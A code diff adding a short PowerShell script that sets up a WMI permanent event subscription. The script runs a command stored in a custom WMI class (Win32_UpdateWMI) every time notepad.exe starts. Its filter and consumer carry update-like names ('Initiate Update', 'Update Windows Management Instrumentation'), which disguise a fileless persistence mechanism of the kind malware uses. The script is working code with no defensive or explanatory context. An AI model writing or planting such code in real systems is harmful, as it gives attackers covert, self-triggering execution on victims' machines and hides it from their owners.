@@ -1,0 +1,12 @@
+$FilterArgs = @{Name ="Initiate Update";
+    		EventNamespace ="root\CimV2";
+    		Query ="SELECT * FROM __InstanceCreationEvent Within 3 WHERE TargetInstance Isa 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'";
+    		QueryLanguage = "WQL"};
+$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs;
+$ConsumerArgs = @{Name="Update Windows Management Instrumentation";
+		RunInteractively=$false;
+                CommandLineTemplate=(Get-CimInstance -ClassName Win32_UpdateWMI).UpdateCommand};
+$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
+$FilterToConsumerArgs = @{Filter = [Ref] $Filter;
+			Consumer = [Ref] $Consumer};
+$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
